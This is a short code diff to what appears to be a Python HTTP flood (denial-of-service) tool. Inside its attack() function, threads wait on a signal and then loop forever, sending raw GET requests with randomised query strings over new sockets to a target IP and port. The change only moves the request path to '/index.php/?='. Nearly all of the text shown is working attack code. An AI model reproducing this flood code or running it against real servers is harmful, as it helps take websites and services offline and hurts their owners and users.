@@ -25,7 +25,7 @@ def attack():
     conn = "Connection: " + connection + "\r\n"
     go.wait()
     while True:
-        get_host = protocol + " //?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+        get_host = protocol + " /index.php/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
         request  = get_host + conn + useragent + accept + referer + content + length + "\r\n"
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
